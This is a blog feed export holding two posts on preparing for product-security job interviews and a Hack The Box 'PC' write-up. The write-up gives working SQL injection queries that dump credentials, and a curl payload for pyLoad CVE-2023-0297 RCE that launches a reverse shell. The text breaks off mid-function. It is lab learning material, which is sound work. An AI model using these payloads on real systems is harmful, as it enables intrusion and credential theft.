<li>Blogs from security research organizations like <a href="https://unit42.paloaltonetworks.com/">Palo Alto Networks Unit 42</a>, <a href="https://googleprojectzero.blogspot.com/">Google Project Zero</a>, <a href="https://blog.assetnote.io/">Assetnote</a>, <a href="https://www.zerodayinitiative.com/blog">Trend Micro ZDI</a>, <a href="https://blog.talosintelligence.com/">Cisco Talos Blog</a>, etc.</li>
<li>Social Media (LinkedIn/X)</li>
<li>Medium blogs</li>
</ul>
</li>
<li>
<p><strong><em>Unconventional</em> Sources</strong>: I also find information related to security using some of these non-conventional sources:</p>
<ul>
<li>YouTube: Many hackers/security experts make educational videos on a variety of security-related topics. Some of my favorites are: <a href="https://www.youtube.com/@ippsec">IppSec</a>, <a href="https://www.youtube.com/@LiveOverflow">LiveOverflow</a>, <a href="https://www.youtube.com/@_JohnHammond">John Hammond</a>, <a href="https://www.youtube.com/@BugBountyReportsExplained">Bug Bounty Reports Explained</a>, <a href="https://www.youtube.com/@NahamSec">NahamSec</a></li>
<li><a href="https://hackerone.com/hacktivity/overview">HackerOne hacktivity</a>: Reading through bug bounty disclosures can provide insights into possible ways to exploit vulnerabilities. Some of the reports are very creative.</li>
</ul>
</li>
</ul>
<p><strong>Books</strong>: Although I did not use these books specifically for interview preparation, I have learned a lot from them.</p>
<ul>
<li>The Tangled Web ‚Äî Michal Zalewski</li>
<li>Computer Security, A Hands-on Approach ‚Äî Wenliang Du</li>
<li>The Web Application Hackers Handbook ‚Äî Dafydd Stuttard and Marcus Pinto</li>
<li>Cryptography and Network Security ‚Äî William Stallings</li>
<li>The Hacker Playbook ‚Äî Peter Kim</li>
</ul>
<p><strong>Practical Exploitation Practice</strong>: I feel I learn better by doing things. So I try my hand at CTFs or platforms like HackTheBox, TryHackMe, PortSwigger Web Security Academy, and others. I did not do these specifically for the interviews, it is just something I do sometimes to sharpen my skills.</p>
<h2 id="code-review">Code Review</h2>
<p>Due to my interest in static analysis, I looked at a lot of code for security flaws at work. This prepared me for the code review interviews. Here are some tips that might be helpful:</p>
<ul>
<li>
<p>Have a checklist of things to look for. <a href="https://github.com/mgreiler/secure-code-review-checklist">This</a> GitHub repo provides a great list that you can adapt for yourself.</p>
</li>
<li>
<p>Practice with some known vulnerable apps. There are many to choose from:</p>
<ul>
<li><a href="https://github.com/juice-shop/juice-shop">Juice Shop</a></li>
<li><a href="https://github.com/digininja/DVWA">DVWA</a></li>
<li><a href="https://github.com/WebGoat/WebGoat">WebGoat</a></li>
<li>Many more are listed <a href="https://github.com/vavkamil/awesome-vulnerable-apps">here</a></li>
</ul>
</li>
<li>
<p>Semgrep Playground has an option to try out existing rules. The rule test has code that Semgrep will flag, and code it will not. Assuming the rule is correct, the code that Semgrep will flag will be vulnerable, and therefore you can use that to understand vulnerable patterns.</p>
</li>
</ul>
<h2 id="threat-modeling-interview">Threat Modeling Interview</h2>
<p>To be good at threat modeling, you will first need to have good technical knowledge. If you know how certain issues can impact systems, when you see a system that has these deficiencies, you can identify the issues. The next step would be to identify a threat modeling process that works best for you. There is no best method, but in my experience the most popular is STRIDE. There are other frameworks too like DREAD or PASTA. You can practice by looking at architectures and enumerating threats in them. You can also take an application (eg: a restaurant reservation system) and list potential threats in such an application.</p>
<p>Here are some resources to prepare for threat modeling interviews:</p>
<ul>
<li><a href="https://shostack.org/resources/threat-modeling">The Ultimate Beginner‚Äôs Guide to Threat Modeling</a></li>
<li><a href="https://owasp.org/www-community/Threat_Modeling_Process">Threat Modeling Process</a></li>
<li><a href="https://threat-modeling.com/the-ultimate-list-of-stride-threat-examples/">List of example STRIDE threats</a></li>
<li><a href="https://shostack.org/blog/category/threat-model-thursday">Shostack + Associates ‚ÄúThreat Model Thursday‚Äù Series</a></li>
</ul>
<h2 id="coding-interview">Coding Interview</h2>
<p>I did not prepare much for coding interviews since the roles I was interested in did not have a coding interview. I relied on my coding skills from work or leisure projects to attempt the very few coding interviews I had. There are already many resources on the internet that provide detailed preparation guides for coding interviews. Please refer to them for coding interview guidance.</p>
<h2 id="behavioral-interview">Behavioral Interview</h2>
<p>Preparing for a behavioral interview involves understanding the format and anticipating questions that assess your past behavior in certain situations. It is important to have personal examples ready for commonly asked behavioral questions. There are many lists of common behavioral questions that you can look at, or you can ask ChatGPT to provide some examples. Using the STAR method is a great way to answer behavioral questions. STAR stands for Situation, Task, Action, and Result. Here‚Äôs an example (courtesy of ChatGPT):</p>
<p><em>Can you provide an example of a time when you had to overcome a significant challenge in a team project?</em></p>
<p><em>Situation</em>: In my previous role as a project manager, our team was tasked with implementing a new software system within a tight deadline.</p>
<p><em>Task</em>: One of the key challenges was that we faced unexpected technical issues during the implementation phase, jeopardizing the project timeline.</p>
<p><em>Action</em>: Recognizing the urgency, I immediately called for a team meeting to discuss the issues openly. I assigned specific tasks to team members based on their expertise, ensuring everyone had a clear role in addressing the technical challenges. Simultaneously, I collaborated with the IT department to expedite troubleshooting.</p>
<p><em>Result</em>: Through our collaborative efforts, we successfully identified and resolved the technical issues within the deadline. This experience highlighted the importance of effective communication and swift problem-solving. As a result, our team developed stronger bonds and increased our overall efficiency in handling unexpected challenges.</p>
<h2 id="leadership-interviews">Leadership Interviews</h2>
<p>I am clubbing interviews with the manager, director, or more senior leadership in this section. In general, I felt these were more conversations than interviews ‚Äî to understand my experiences and interests and to tell me more about the role or the company. Be prepared to answer questions about your experiences and background, why you are looking for a change, and what interests you in the company. It helps to familiarize yourself a little with the products or services the company offers. There might be some technical questions involved. I have already covered above how you can prepare for these.</p>
<h2 id="general-tips">General Tips</h2>
<p>Some general tips that might help with the preparation or interview:</p>
<ul>
<li>Read the job description thoroughly. The technical interviews were almost always related to the responsibilities mentioned in the job description.</li>
<li>Ask the recruiter about the interview process ‚Äî how many rounds will be there, what each round will entail, how long you can expect the process to take, and if they have any preparation tips.</li>
<li>Ask questions to your interviewers. Some examples: what challenges they face, what tasks/projects they find most interesting, why they enjoy working at the company, and so on. If you are speaking with the manager or leadership, ask them about their leadership style, what specific tasks you might work on, how they promote employee growth, and so on.</li>
<li>Be honest. If you don‚Äôt know something, let your interviewer know about it. Take a guess based on what you know ‚Äî but be sure to inform your interviewer.</li>
<li>Try to keep calm. Interviews can be nerve-wracking, especially if you feel they are not going well. Even if you are not able to answer anything, keeping calm will let you think much better and take educated guesses. The interviewers might not be expecting you to know everything ‚Äî and they might want to understand how you think or approach problems.</li>
<li>Try to free up your schedule at work. Since panel interviews will likely be multiple interviews within a day or two, you will need to have a few hours free on various days. Therefore, plan your work ahead of time. Make sure once you are actively interviewing, you have a good number of available slots.</li>
<li>Self-analyze your performance after an interview. Determine what areas you did well on and what areas you need to spend more time preparing. The first few interviews for me did not go very well ‚Äî because I did not know what to expect in terms of questions, and also how well I had prepared. From them, I was able to prepare better for the upcoming interviews.</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Tales from my Product Security Job Hunt: Part 1, Interview Types</title>
            <link>http://localhost:1313/posts/types-of-interviews/</link>
            <pubDate>Sun, 07 Jan 2024 16:12:46 -0800</pubDate>
            
            <guid>http://localhost:1313/posts/types-of-interviews/</guid>
            <description>&lt;p&gt;After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.&lt;/p&gt;
&lt;p&gt;Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences. Therefore, I am writing this two-part series that will talk about the types of interviews I attempted, and how I prepared for them. This blog in particular will list the types of interviews. In the next one, I will talk about my preparation and provide some tips that worked for me.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>After spending 4 amazing years at Adobe, I recently decided it was time to take the next step in my career. I was fortunate to interview with several companies that varied in terms of their domain, size, or the maturity of their security processes.</p>
<p>Many of those whom I informed about my decision and/or my interviews were interested in knowing what the process was like and how I prepared. After answering the same questions a few times, I thought it would be helpful to potential job seekers if I documented my experiences. Therefore, I am writing this two-part series that will talk about the types of interviews I attempted, and how I prepared for them. This blog in particular will list the types of interviews. In the next one, I will talk about my preparation and provide some tips that worked for me.</p>
<p>This list is specifically catered to the type of positions I was interviewing for. The interview rounds you have will vary according to your search criteria. My criteria:</p>
<ul>
<li>Experience: Mid-level (~4‚Äì5 years of experience)</li>
<li>Role: Product Security / Application Security</li>
</ul>
<h2 id="interview-process">Interview Process</h2>
<p>The interview process varied by company, but the general framework was:</p>
<ul>
<li>Recruiter call</li>
<li>Basic technical interview</li>
<li>Virtual panel-style interviews</li>
</ul>
<p>In some cases, I spoke to the hiring manager before the first technical interview.</p>
<p>After the basic technical round, the next few rounds were often set up in a ‚Äúvirtual panel‚Äù style. This means they were set up concurrently (as opposed to a sequential setup where the next interview is set only if I perform well in the first).</p>
<p>Since the interview process varies a lot by company. I would recommend speaking with the recruiter regarding the process, specifically how many rounds to expect and what type of interviews they will be.</p>
<h2 id="recruiter-call">Recruiter call</h2>
<p>Typically, the first person you‚Äôd speak to will be a recruiter. In most cases, this is not an interview. The recruiter provides more information about the job role and the team. They might have a conversation about compensation expectations, visa requirements, and other administrative items. You may ask them for interview preparation guidance too. I have received great pointers regarding areas to concentrate on!</p>
<p>At times the recruiter also asked very basic security questions. Some questions include:</p>
<ul>
<li>What is (XSS, SQLi, CSRF, ‚Ä¶, or any other common security issue)?</li>
<li>Difference between encryption and hashing.</li>
<li>How to store passwords in a DB.</li>
</ul>
<h2 id="basic-technical-interview">Basic Technical Interview</h2>
<p>The first interview round was always a basic technical interview. We discussed common security issues and their mitigations (think OWASP top 10). Since I was interviewing for a mid-level position, I was expected to answer in-depth questions about security issues/concepts rather than just the definitions or basic mitigation steps. Some examples of questions I was asked:</p>
<ul>
<li>What are the types of XSS? How can you mitigate DOM XSS?</li>
<li>How can you prevent CSRF in a case where we cannot use CSRF tokens?</li>
<li>What is the principle behind using prepared statements for SQL injection mitigation?</li>
<li>If using AES for encryption, which mode would you prefer between ECB, CBC, or GCM, and why?</li>
<li>Explain a TLS handshake. (This seems to be a favorite amongst interviewers. I think this was the most commonly asked question.)</li>
<li>What is the same origin policy and how does CORS relate to it? (Another favorite.)</li>
</ul>
<p>The basic technical interview occasionally included questions about my resume (the other place where I was asked about my resume was during the manager interview). One of my interviewers and I shared a deep interest in static analysis and supply chain security ‚Äî so we spent quite a bit of the interview talking about it!</p>
<h2 id="manager-interview">Manager Interview</h2>
<p>I spoke with the hiring manager at the beginning of the application process for most of the roles. However, for a few positions, the manager interview occurred later, specifically during the panel interviews.</p>
<p>Generally, the conversation was aimed at understanding my general background and experience, and I was provided insights into what tasks I would work on if I joined. The general idea was to make sure my expectations were in line with what the role had to offer and vice-versa. Some included basic technical questions. Others included questions that tested the ability to think of scalable solutions or design initiatives. For eg: I was given some of the challenges the team faced and asked how I would approach them.</p>
<h2 id="deeper-technical-interview">Deeper Technical Interview</h2>
<p>Wherever I made it to the next round, I had at least one deeper technical interview. This either consisted of going very deep into one or two common security issues or questions about security issues that are not as common (or not in the OWASP top 10). There might be scenario-based questions or domain-specific questions in this interview too. For eg, if you are applying to a role that requires knowledge of mobile application security, you will likely be asked about mobile-specific items.</p>
<p>Let‚Äôs take an example of XSS. The interviewer might first start with basic XSS questions like types of XSS, the difference between them, and so on. The more technical questions might include:</p>
<ul>
<li>If using CSP, how can you still allow some inline JavaScript to run?</li>
<li>If using CSP nonce, how should the nonce be generated and set?</li>
<li>Given a code snippet and some disallowed characters, is XSS possible in the scenario? Provide a payload.</li>
<li>How does output sanitization help in mitigating XSS? Why is it better than input encoding?</li>
</ul>
<p>Some other security concepts/issues I was asked about:</p>
<ul>
<li>Insecure deserialization (including providing an example in a language of choice).</li>
<li>XML external entities (XXE).</li>
<li>NoSQL Injection.</li>
<li>Memory-based issues (buffer/heap overflow, use after free, double free).</li>
<li>OAuth and its grant types.</li>
</ul>
<h2 id="code-review">Code Review</h2>
<p>The premise of the code review interview is to understand if by looking at code, you can identify security issues. I have been asked to review code at various stages of the interview process. Most often it is a part of the deeper technical interview. The basic technical interview can also sometimes include some basic code review. At one company, I had a dedicated code review interview. The things I had to look for (or rather, things I found) include XSS, SQL/NoSQL injection, authentication/authorization bypass, and missing security controls.</p>
<p>Not every code review was in a language I was familiar with, so you might have to read code in a language new to you. For the most part, they were still common languages with syntax I could more or less understand. Whenever I had a language I had not worked with, I informed the interviewer about it. They were happy to answer any language-specific questions I had, e.g. if I was unfamiliar with a certain function or certain way a statement was written. Languages I looked at include Python, Ruby, C, and Java. (One interviewer gave me a choice of Python, JavaScript, and a few others, I chose Python.)</p>
<h2 id="threat-modeling">Threat Modeling</h2>
<p>In nearly every company I interviewed with, I had to threat model a given system. Sometimes it was included in the deeper technical interview, other times it was a dedicated interview. I encountered two kinds of threat modeling questions:</p>
<ul>
<li>Abstract ‚Äî I was asked to list potential threats in an application (eg: restaurant reservation system). This did not include any diagrams or workflows. My approach here was to list potential issues ‚Äî and ask the interviewer if they wanted me to elaborate on anything. Based on what I listed, the interviewers asked me follow-up questions.</li>
<li>Specific ‚Äî I was given either architecture diagrams or sequence diagrams and sometimes implementation details and I had to find issues that exist in the given service. The service in question would be much smaller in scope as compared to the abstract case (eg: the service in the restaurant reservation system that takes input from restaurants and generates the listing for users). In this case, I could not just list potential issues in the service. I had to show how the malicious payload might enter the system, where it would be triggered, and what parts it would impact.</li>
</ul>
<p>The interviewer might add additional scenarios or caveats to the service after the initial walkthrough. Some interviewers asked me to conduct the threat modeling as if I were working with a software engineer who was building the given service, and I was performing the security review. This meant I had to ask questions about the service or provide recommendations without using too much security jargon.</p>
<h2 id="behavioral">Behavioral</h2>
<p>Almost all companies had a behavioral round. Some had multiple rounds. I was asked general behavioral questions like:</p>
<ul>
<li>Can you give an example of a project or task that didn‚Äôt go as planned? What did you do to address the issues and what was the outcome?</li>
<li>Tell me about a time when you had to adapt to a major change at work. How did you approach it?</li>
<li>Give me an example of a time when you had to prioritize multiple tasks or projects. How did you decide what to focus on first?</li>
<li>Describe a time when you had to learn a new skill or technology quickly. How did you go about it, and how did it impact your work?</li>
<li>Can you share a situation where you faced a challenging problem at work? What steps did you take to analyze and solve it?</li>
<li>Generally, these interviews were taken by someone not on the immediate team I was applying for.</li>
</ul>
<h2 id="coding">Coding</h2>
<p>I have seen coding rounds being asked for roles that require building tooling or implementing security features. Since I was not looking for a role like that, most companies I applied to did not have a coding round. In the few that had, the questions were of two types:</p>
<ul>
<li>Leetcode easy/easy-medium type questions.</li>
<li>General scripting questions that tested familiarity with a language of choice.</li>
</ul>
<p>My understanding, from the explanations of the interviewers, is that they had a few projects that required some amount of coding so they wanted a candidate who was comfortable writing small scripts or building simple automated tools. They were not looking for a very proficient coder since coding was a small part of the responsibilities.</p>
<h2 id="director--leadership-conversations">Director / Leadership Conversations</h2>
<p>More often than not, I had the opportunity to speak to the director of the team that was hiring. This was much later in the interview process, typically after I had completed the technical rounds. It was similar to the conversation with the manager ‚Äî questions about my background and what I was looking for in my next role.</p>
<p>In a few rare instances, I had conversations with senior leadership including CTOs and/or CISOs. Although I was very nervous about speaking to senior leadership ‚Äî they usually just wanted to get to know me and what I was looking for role / career-wise.</p>
<h2 id="funinteresting-questions">Fun/Interesting questions</h2>
<p>During my interviews, I was asked some fun/interesting questions. These don‚Äôt fall into any one interview in particular. They are not difficult questions, just things I was not prepared to answer or had never thought about ‚Äî so they caught me slightly off guard.</p>
<ul>
<li>What is your favorite security vulnerability to work on?</li>
<li>What is the last thing you learned? (The interviewer specified it did not have to be security or tech-related, I still spoke about some CVE‚Ä¶)</li>
<li>What is something that you can teach me in the next 2 minutes (Again, the interviewer did not want a security or tech-related answer. If you know any party tricks, they will probably be a hit! I sadly did not know any.)</li>
<li>Questions about my hobbies: It is possible that you and your interviewer share hobbies. I did, and I was asked about some specifics. Since I was not expecting a question about my hobbies, it took me a few moments to gather my thoughts.</li>
</ul>
<hr>
<p>I hope you found this useful. Do check out part 2, where I talk more about the interview prep. If you have any questions or need any help with interview prep, don‚Äôt hesitate to reach out to me (preferably on LinkedIn).</p>
]]></content>
        </item>
        
        <item>
            <title>Hack the Box ‚Äî PC, but automated</title>
            <link>http://localhost:1313/posts/htb-pc/</link>
            <pubDate>Mon, 06 Nov 2023 20:05:09 -0800</pubDate>
            
            <guid>http://localhost:1313/posts/htb-pc/</guid>
            <description>&lt;p&gt;PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of ‚ÄúI wrote a script that can solve this box‚Äù. I found this quite intriguing and decided to write a script that could solve the box myself.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of ‚ÄúI wrote a script that can solve this box‚Äù. I found this quite intriguing and decided to write a script that could solve the box myself.</p>
<p><em>Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There‚Äôs also ippsec‚Äôs video on his channel.</em></p>
<p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
<p>The complete code for this script can be found on <a href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
<h2 id="setup-grpc">Setup grpc</h2>
<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using the grpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp.proto">here</a>. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -m grpc_tools.protoc -I../../protos --python_out<span style="color:#f92672">=</span>. --pyi_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. SimpleApp.proto
</span></span></code></pre></div><p>For me, this generated 2 additional files, <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a> and <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a> . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.</p>
<p>Once we have the required files generated, we can connect to the grpc service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_setup_grpc</span>(self):
</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>grpc_port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>    stub <span style="color:#f92672">=</span> pb2_grpc<span style="color:#f92672">.</span>SimpleAppStub(channel)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> stub
</span></span></code></pre></div><p>Here <code>pb2_grpc</code> contains the client and server classes corresponding to protobuf-defined grpc services.</p>
<h2 id="sql-injection-in-grpc">SQL Injection in grpc</h2>
<p>The grpc service exposes a <code>getInfoRequest</code> which takes an id parameter. It then uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can exploit it by making a query like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
</span></span><span style="display:flex;"><span>pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query) 
</span></span></code></pre></div><p>Here <code>pb2</code> is the protobuf client we will use to interact with the grpc service. The above request will get the tables from <code>sqlite_master</code>.</p>
<p>This does not work out of the box, however. It requires an admin token to be sent as metadata. We can obtain the token by sending a <code>LoginUserRequest</code>. The username/password is conveniently set to admin/admin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_token</span>(self):
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>LoginUserRequest(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>)
</span></span><span style="display:flex;"><span>    _, call <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>LoginUser<span style="color:#f92672">.</span>with_call(user)
</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> call<span style="color:#f92672">.</span>trailing_metadata()
</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> metadata[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>value[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
</span></span></code></pre></div><p>Once I had the token, I could make the <code>getInfoRequest</code> request and get the user details. To get the user details, I first got the table name, then the columns in the table, and finally queried all the columns of the table.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_users</span>(self) <span style="color:#f92672">-&gt;</span> dict:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Getting users&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
</span></span><span style="display:flex;"><span>    table <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info(&#39;</span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>    cols <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> col <span style="color:#f92672">in</span> cols<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>):
</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(</span><span style="color:#e6db74">{</span>col<span style="color:#e6db74">}</span><span style="color:#e6db74">) FROM </span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    usernames <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    passwords <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    users <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(usernames)):
</span></span><span style="display:flex;"><span>        users<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;username&#34;</span>: usernames[i], <span style="color:#e6db74">&#34;password&#34;</span>: passwords[i]})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Users found&#34;</span>)
</span></span><span style="display:flex;"><span>    print(json<span style="color:#f92672">.</span>dumps(users))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> users
</span></span></code></pre></div><p>The <code>_sql_injection_request</code> function is defined as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sql_injection_request</span>(self, query):
</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;token&#34;</span>, self<span style="color:#f92672">.</span>token),)
</span></span><span style="display:flex;"><span>    id_request <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query)
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>getInfo<span style="color:#f92672">.</span>with_call(id_request, metadata<span style="color:#f92672">=</span>metadata)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>message
</span></span></code></pre></div><h2 id="getting-user-flag">Getting user flag</h2>
<p>The user list has a user <code>sau</code> , who has SSH access to the machine. The next step is to start an SSH session and read the user flag stored at <code>/home/sau/user.txt</code>. This is quite straightforward. I created a simple SSH Client using the <code>paramiko</code> library and executed <code>cat /home/sau/user.txt</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_command</span>(self, command):
</span></span><span style="display:flex;"><span>    ssh_stdin, ssh_stdout, ssh_stderr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>exec_command(command)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssh_stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
</span></span></code></pre></div><h2 id="pyload-cve">PyLoad CVE</h2>
<p>PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are vulnerable to pre-auth RCE (CVE-2023‚Äì0297). There are many available exploits for this vulnerability. You can read more about the vulnerability and the exploit <a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">here</a>.</p>
<p>The vulnerability allows us to execute a payload like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data-binary
</span></span><span style="display:flex;"><span><span style="color:#e6db74">$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/home/sau/shell.sh\&#34;);f=function%20f2()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">$&#39;http://localhost:8000/flash/addcrypted2&#39;</span>
</span></span></code></pre></div><p>Here, I am running a script called <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a> which is just a bash reverse shell.</p>
<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user‚Äôs machine to the box. I chose the alternate option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
<p>I used SFTP to transfer the reverse shell to the box:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer_file_from_local</span>(self):
</span></span><span style="display:flex;"><span>    ftp_client <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>open_sftp()
